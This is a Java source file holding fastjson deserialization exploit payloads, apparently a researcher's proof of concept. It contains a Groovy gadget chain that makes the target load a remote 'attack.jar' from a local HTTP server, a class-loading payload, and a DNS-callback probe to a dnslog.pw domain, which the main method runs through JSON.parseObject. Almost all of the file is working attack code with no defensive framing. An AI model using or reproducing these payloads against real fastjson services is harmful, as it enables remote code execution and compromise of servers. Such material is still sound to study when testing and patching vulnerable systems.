import com.alibaba.fastjson.JSON;

import java.io.IOException;

public class groovy_copy {
    private static String poc1 = "{\n" +
            " \"@type\":\"java.lang.Character\"{\n" +
            " \"@type\":\"java.lang.Class\", \n" +
            "  \"val\":\"com.alibaba.fastjson.JSON.parseObject\" \n" +
            "\t}\n" +
            "}";



    private static String poc2 = "{\n" +
            "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
            "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
            "    \"config\":{\n" +
            "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
            "        \"classpathList\":\"http://127.0.0.1:8000/attack.jar\"\n" +
            "    }\n" +
            "}";


    private static String testPoc = "" +
            "{\n" +
            " \"@type\":\"java.lang.Exception\"，\n" +
            " \"@type\":\"com.alibaba.fastjson.JSONException\", \n" +
            " \"x\":{\n" +
            "    \"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"7dok0ohg.dnslog.pw\"}\n" +
            "  }\n" +
            "}\n";


    public static void main(String[] args) throws IOException {


         JSON.parseObject(testPoc);;


//        JSON.parseObject(poc2);
    }

}
